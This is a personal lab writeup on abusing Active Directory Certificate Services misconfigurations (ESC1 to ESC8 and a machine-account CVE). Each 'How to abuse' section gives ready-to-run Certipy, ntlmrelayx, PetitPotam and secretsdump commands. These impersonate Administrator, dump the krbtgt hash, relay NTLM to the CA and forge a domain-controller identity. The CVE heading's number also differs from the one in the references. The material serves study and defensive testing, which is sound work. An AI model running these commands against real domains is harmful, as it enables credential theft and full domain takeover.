

During the last week, I wanted to read more in depth about Active Directory Certification Services, so I started to work and read the awesome paper from Specter Ops, as well as other articles which I will refer to through this post.
You won't find anything new here, I simply wanted to understand how this technology works and to try the differents cases of abuse against it.
<br></br>

<h2 align="center" id="heading">Index</h2>

1. [Active Directory Certification Services](#ADCS)
2. [Certificate Templates](#CT)
3. [Enumeration](#enumeration)
4. [ESC1: Misconfigured Certificate Templates Allows requesters to specify a SA](#ECS1)
5. [ESC2: Certificate template can be used for any purpose](#ECS2)
6. [ESC3: Misconfigured Enrollment Agent Templates](#ECS3)
7. [ESC4: Vulnerable Certificate Template Access Control](#ECS4)
8. [ESC5: Vulnerable PKI Object Access Control](#ECS5)
9. [ESC6: CA has EDIT_ATTRIBUTESUBJECTALTNAME2 flag set](#ECS6)
10. [ESC7: Vulnerable Certificate Authority Access Control](#ECS7)
11. [ESC8: NTLM Relay to AD CS HTTP Endpoints](#ECS8)
12. [CVE-2022-29623](#CVE-2022-29623)
13. [References](#references)


<a name="ADCS"></a>
<br></br>
<a name="Active Directory Certification Services"></a>
 <h2 align="center" id="heading">Active Directory Certification Services:</h2>


Active Directory Certificate Services ( AD CS for the rest of the post), As per Microsoft, AD CS is a “Server Role that enables you to construct public key infrastructure (PKI) and give open key cryptography, computerized authentication, and advanced mark abilities for your association.”


This server Role, was introduced in Windows Server 2008, It is not installed by default, but is widely used.
It is not easy to perform a correct configuration, so may be encountered environments with serious misconfigurations.


To understand this implementation of Public Key Infrastructure within Active Directory, it is important to know some concepts:


* PKI (Public Key Infrastructure) — a system to manage certificates/public key encryption.
* PKINIT - Public Key Cryptography for Initial Authentication in Kerberos Protocol.
* AD CS (Active Directory Certificate Services) — Microsoft’s PKI implementation.
* CA (Certificate Authority) — PKI server that issues certificates.
* Enterprise CA — CA integrated with AD (as opposed to a standalone CA), offers certificate templates.
* Certificate Template — a collection of settings and policies that defines the contents of a certificate issued by an enterprise CA.
* CSR (Certificate Signing Request) — a message sent to a CA to request a signed certificate.
* EKU (Extended/Enhanced Key Usage) — one or more object identifiers (OIDs) that define how a certificate can be used.


![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/1ADCS.png?raw=true)
<a name="CT"></a>
<br></br>
 <h2 align="center" id="heading">Certificate Templates:</h2>
                                             
                                               
All Enterprise CA servers issue certificates based on one or more of the certificate templates. You cannot create a new template from scratch.
There is only one set of templates, and they are stored in Active Directory for the entire forest. Each Enterprise CA server in the forest uses the same set of templates, regardless of domain or subdomain membership. However, this doesn’t mean you have to enable the same set of templates on all Enterprise CA servers. Instead, you can enable different templates on each Enterprise CA server.

But, what is a certificate template?. **The certificates templates are just collections of enrollment policies and predefined certificate settings.**

In a template you can define things like:
* Validity/ Renewal period
* Who can request a certificate? For whom?
* What actions can be carried out with this certificate?
* How is the subject specified?
* …


![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/CertiTemplate1.png?raw=true)  

Performing a correct configuration, not only on the own CA, also of the properties that define each template is not a easy task, so it is likely to encounter missconfigurations.

In the awesome whitepaper of specter ops, we not only find how to abuse these misconfigurations, but also how to steal the certificates, but in this post I wanted to go to the point and test in my environment each of the attacks to understand them a little better.

<a name="enumeration"></a>
<br></br>
 <h2 align="center" id="heading">AD CS Enumeration</h2>
 

pkicertificatetemplate             Specify the template’s schema version
mspki-enrollment-flag --> Specifies [enrollment flags](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-crtd/ec71fd43-61c2-407b-83c9-b52272dec8a1)Specifies the number of enrollment registration authority signatures that are required in an enrollment request
mspki-ra-signature:
mspki-certificate-name-fla: 



 
```
																																									Extended Key Usages (EKUs - pkiextendedkeyusage Attribute) : 
																																									
																																																Value                            Definition

																																										1.3.6.1.5.5.7.3.3        -->  						 Code Signing                                             
																																										1.3.6.1.4.1.311.10.3.4   -->   						Encrypting File System                                   
																																										1.3.6.1.5.5.7.3.4        -->   						Encrypting Mail                                          
																																										1.3.6.1.4.1.311.20.2.2   -->   						Smart Card Logon                                         
																																										1.3.6.1.5.5.7.3.2        -->  						 Authentication to another server                         
																																										1.3.6.1.5.2.3.4          -->   						PKINIT Client Authentication (Needs to be added manually)
																																										1.3.6.1.5.5.7.3          -->   						Server Authentication (Identifying servers)              					
																																										2.5.29.37.0              -->   						Any Porpuse                                              
```


Certipy can help us quickly enumerate certificate templates, certificate authorities and other configurations, we can export the output in different formats, it is useful to be able to import the results directly into bloodhound (You will need to add [Certipy custom queries](https://github.com/ly4k/Certipy/blob/main/customqueries.json)):

```
certipy find 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1' -bloodhound
 ```
 <p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/CustomQuery1.png?raw=true"/>
</p>

 
<a name="ECS1"></a>
<br></br>
<h3 align="center" id="heading">ESC1: Misconfigured Certificate Templates Allows requesters to specify a SA:</h3>


In order to be able to abuse this configuration, a series of requirements are needed, before listing them, it is important to define what the SAN is:
Subject  Alternative  Name  (SAN)  is  an  extension  to  X.509  that  allows various identities to be bound to a certificate beyond the subject;

By default during certificate-based authentication, certificates are mapped to Active Directory accounts based on a user principal name (UPN) specified in the SAN;
So, when a certificate template allows requester to specify a SAN, it is possible to request a certificate for another user;

It can be used for privileges escalation if the certificate template defines EKUs that enable domain authentication and can be enrolled by non- privileged user without manager approval.
The certificate template’s AD object specifies if the requester can specify the SAN in its mspki-certificate-name-flag property. The mspki-certificate-name-flag property is a bitmask and if the CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT flag is present, a requester can specify the SAN:


![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC1.png?raw=true)

* In addition, it is necessary that the enterprise CA's configuration must allow low privileged users the ability to request certificates. 
* That the Approval Manager is disabled.
* Authorized signatures are not required.
* Have certificate enrollment rights that allow a low-privileged attacker to request and obtain a certificate based on the template.

How to abuse:

* We can request a certificate based on the vulnerable certificate template and specify an arbitrary SAN
```
 certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1' -alt 'Administrator@EvilCorp.local'
 
 certipy auth -pfx administrator.pfx
 
 csecretsdump.py -hashes :669556eda1adbb10afdf29f42760db39 Administrator@EVILDC1.evilcorp.local -just-dc-user krbtgt
 
```
<a name="ECS2"></a>
<br></br>
<h3 align="center" id="heading">ESC2: Certificate template can be used for any purpose:</h3>

In this case, the same requirements are needed as in ESC1, but with the variant that the template specifies the EKU Any Purpose, or no EKU, the certificate can be used for anything.
It can be abuse in other ways, such as code signing, server authentication, or in the same way we will see in ESC3, to request another certificate on behalf of any other user.

Requirements:

* The Enterprise CA grants low-privileged users enrollment rights. Details are the same as in ESC1.
* No manager approval.
* No authorized signatures are required. 
* An overly permissive certificate template security descriptor grants certificate enrollment rights to low-privileged users.
* The certificate template defines the Any Purpose EKU or no EKU

![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC2.png?raw=true)


How to abuse:

1. If the requester can specify a SAN, ESC2 vulnerable certificate can be abused like ESC1:
```

certipy req 'EVILCORP/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC2' -alt 'Administrator@EvilCorp.local'
 
```
2. It can be abused like ESC3 (See below) – the ESC2 vulnerable certificate can be used to request another one on behalf of any other user:

Request a certificate based on the vulnerable certificate template ESC3:
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
 
```
Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
 
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
 
```

<a name="ECS3"></a>
<br></br>
<h3 align="center" id="heading">ESC3: Misconfigured Enrollment Agent Templates:</h3>

For this case, we need to know what Enrollment Agents are, they are users who can enroll a certificate on behalf of another user.
The issued certificate from ESC3 vulnerable template allows to request another certificate on behalf of any user (it means that it is possible to impersonate any user). This is because the the certificate template defines the Certificate Request Agent EKU. The CertificateRequest Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificatetemplates on behalf of other principals.

Also, in order to abuse this missconfiguration, a CAs requires at least two templates matching this requirements:
 Condition 1 :
  *  A template allows a low-privileged user to enroll in an enrollment agent certificate
  *  That the Approval Manager is disabled.
  *  Authorized signatures are not required.
  *  The certificate template defines the Certificate Request Agent EKU. The Certificate Request Agent OID (1.3.6.1.4.1.311.20.2.1) allows for requesting other certificate templates on behalf of other principals.

Example of a template that matches Condition 1:

![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC3.png?raw=true)

  Condition 2 :
  * Another template permits a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.
  * Manager approval is disabled.
  * The template schema version 1 or is greater than 2 and specifies an Application Policy Issuance Requirement requiring the Certificate Request Agent EKU.
  * The certificate template defines an EKU that allows for domain authentication.
  * Enrollment agent restrictions are not implemented on the CA.

Example of a template that matches Condition 2:

![ADCSXMind](https://github.com/RayRRT/ADCS/blob/main/ESC3C2.png?raw=true)

How to abuse:

Request a certificate based on the vulnerable certificate template ESC3:
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC3'
 
```
Now, we can then use the Certificate Request Agent certificate (-pfx) to request a certificate on behalf of other another user:
 
```

certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'ESC3C2' -on-behalf-of 'EvilCorp\Administrator' -pfx 'thehorseman.pfx'
 
```



<a name="ECS4"></a>
<br></br>
<h3 align="center" id="heading">ESC4: Vulnerable Certificate Template Access Control:</h3>

Certificates templates are AD objects, so they have security descriptor, that defines which permissiones AD principals have over the template
Weak permissions (Excessive Access rights) can allow non-privileged users to edit sensitive security settings in the template ( defines EKUs, allows SAN, disable manager approval), thereby making its vulnerable to the ESC1-3 technique.

ACLS: The rights we care about are:


<p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/ACLS4.png?raw=true)" />
</p>

Example of certifcate template with overly permissive ACLs:

<p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/ESC4.png?raw=true)" />
</p>


How to abuse:

First of all, it is important to save the configuration of the template we are going to modify:
```
certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -save-old
```
The certificate template is now vulnerable to the ESC1 technique.
Therefore, we can now request a certificate based on the ESC4 template and specify a SAN:
```
certipy req 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC4' -alt 'Administrator@EvilCorp.local'
```
Now, we can restore the old configuration:
```
certipy template 'EvilCorp/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -template 'Vulnerable ESC4' -configuration 'Vulnerable ESC4.json'
```

<a name="ECS5"></a>
<br></br>
<h3 align="center" id="heading">ESC5: Vulnerable PKI Object Access Control:</h3>

Several objects outside of certificate templates and the certificate authority itself can have a security impact on the entire AD CS system:

* The CA server’s AD computer object 
* The CA server’s RPC/DCOM server
* Any descendant AD object or container in the container CN=Public Key Services, CN=Services, CN=Configuration, DC=demo, DC=local (e.g., the Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, the Enrollment Services Container, etc…)
* If a low-privileged attacker can gain control over any of these, the attack can likely compromise the PKI system. 

In case of gaining control over the NTAuthCertificates object, a CA certificates could be generated and added to this object, take a look [ForgeCert](https://github.com/GhostPack/ForgeCert) tool from Benjamin Delpy.




<a name="ECS6"></a>
<br></br>
<h3 align="center" id="heading">ESC6: CA has EDIT_ATTRIBUTESUBJECTALTNAME2 flag set:</h3>

If EDITF_ATTRIBUTESUBJECTALTNAME2 flag is enabled on an enterprise CA, alternative names are allowed for any certificate templates, regardless of templates' restrictions itself. Microsoft strongly not to enable this flag on an Enterprise CA:

*It is strongly recommended not to enable the EDITF_ATTRIBUTESUBJECALTNAME2 flag on an enterprise CA. If this is enabled, alternative names are allowed for any Certificate Template issued, regardless of how the subject of the certificate is determined according to the Certificate Template. Using this feature, a malicious user could easily generate a certificate with an alternative name that would allow them to impersonate another user. For example, depending on the issuance requirements, it may be possible for a malicious user to request a new certificate valid for smart card logon and request a SAN which contains the UPN of a different user. Since smart card logon uses UPN mapping by default to map a certificate to a user account, the certificate could be used to log on interactively as a different user, which could be a domain administrator or other VIP account. If this flag is enabled, the CA should be limited to require Certificate Manager approval or limit enrollment permissions to only trusted accounts.*

We can check if this setting is enabled using the following command (since this just is using remote registry, it could also be queried with reg query):
```
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
<p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/ESC6.png?raw=true)" />
</p>

How to abuse:

Almost the same as the ESC1, but here you can choose any certificate template that permits client authentication:
```
certipy req 'EvilCorp.local/TheHorseman:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'User' -alt 'Administrator@EvilCorp.local'
```


<a name="ECS7"></a>
<br></br>
<h3 align="center" id="heading">ESC7: Vulnerable Certificate Authority Access Control:</h3>

Outside of certificate templates, a certificate authority itself has a set of permissions that secure various CA actions:

<p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/ESC7.png?raw=true)" />
</p>

From the security perspective it is necessary to care about the Manage CA (aka “CA Administrator”) and Manage Certificates (aka “Certificate Officer”) permissions.


How to abuse:

In case we only have one user with **Manage CA** permission, it will be necessary to add us as **Officer**, which will grant us the **Manage Certificates** permission:
```
certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -add-officer 'MCUser'
```
Next we enable the SubCa template (enabled by default):
```
certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -enable-template 'SubCA'
```
Once we have enabled the SubCa template, and we have the Manager Ca and Manage Certificates permissions, we try to request a certificate based on the SubCA template:
```
certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'SubCA' -alt 'administrator@EvilCorp.local'
```
This request will be denied, just save the private key and the request ID.
With this, we can issue the failed certificate request:
```
certipy ca 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -issue-request 674
```
And finally, retrieve the issued certificate:
```
certipy req 'EvilCorp.local/MCUser:EvilCorp3.@EVILDC1.EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -retrieve 674 
```
<a name="ECS8"></a>
<br></br>
<h3 align="center" id="heading">ESC8: NTLM Relay to AD CS HTTP Endpoints:</h3>

AD CS supports several HTTP-based enrollment methods if additional server roles are installed (Certificate enrollment web service):

<p align="center">
  <img src="https://github.com/RayRRT/ADCS/blob/main/WebEnrollmentRelay.png?raw=true)" />
</p>

How to abuse:

NOTE:

As Dirk-jan comments in his post [NTLM relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) the template that can be used depends on the account that is relayed. For a member server or workstation, the template would be “Computer”. For Domain Controllers this template gives an error because a DC is not a regular server and is not a member of “Domain Computers”. So if you’re relaying a DC then the template should be “DomainController” to match

We can do it directly with Certipy, or also with the implementation of AD CS attack in ntlmrelayx.py by ExAndroidDev:
```
certipy relay -ca 192.168.217.145

python ntlmrelayx.py -t http://EvilCorp-EVILDC1-CA/certsrv/csertfnsh.asp -smb2support --adcs --template 'Domain Controller'
```
Then, all we need is run PetitPotam or dementor for example, to coerce authentication:
```
python3 PetitPotam -d EvilCorp.local -u TheHorseman -p EvilCorp3. 192.168.217.145 EVILDC1
```

<a name="CVE-2022-29623"></a>
<br></br>
<h3 align="center" id="heading">CVE-2022-29623:</h3>

An attacker/user that has the ability to create a machine account and tamper with the dNSHostName attribute to mimic any machine on the domain can abuse Active Directory Certificate Services to request for a certificate as that machine that has been mimicked. In essence if an attacker creates a machine account and manipulates the dNSHostName to that of the Domain Controller, when a certificate is requested as that newly created machine account it will receive a certificate with the authorization as the Domain Controller. This can then be used to get sensitive information from the Domain Controller and eventually full Domain Admin access.

How to abuse:

The first step is create a new machine account with the dNSHostName principle as that of the Domain Controller. We can do this directly using certipy:

```
certipy account create 'EVILCORP/Administrator:EvilCorp1.@EVILDC1.EvilCorp.local' -user 'evilMachine1' -dns 'EVILDC1.EvilCorp.local'
```
Now, request a certificate for the fake machine account and since its dNSHostName value is set to that of the Domain Controller we will get a certificate that has the authentication corresponding to that of the Domain Controller:
```
certipy req 'EvilCorp.local/evil1$:2XrkXdyexxLLyULM@EvilCorp.local' -ca 'EvilCorp-EVILDC1-CA' -template 'Vulnerable ESC1'
```
After this, you can use the auth flag to perform again the UnPac the hash to retrieve the NTLM hash for the Domain Controller machine account.

<a name="references"></a>
<br></br>
<h3 align="center" id="heading">References:</h3>

Posts and talks:

* [Certified Pre-Owned - SpecterOps](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)
* [Hunting for AD CS abuse](
https://speakerdeck.com/heirhabarov/hunting-for-active-directory-certificate-services-abuse)
* [AD CS ESC7-Attack](https://www.tarlogic.com/blog/ad-cs-esc7-attack/)
* [AD CS Manage CA-RCE](https://www.tarlogic.com/blog/ad-cs-manageca-rce/)
* [NTLM Relaying to AD CS](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)
* [ABUSING CVE-2022-26923](https://macrosec.tech/index.php/2022/06/01/abusing-cve-2022-26923-through-socks5-on-a-mythic-c2-agent/)

Tools:

* [Certipy](https://github.com/ly4k/Certipy)
* [Certify](https://github.com/GhostPack/Certify)
* [Certi](https://github.com/zer1t0/certi)


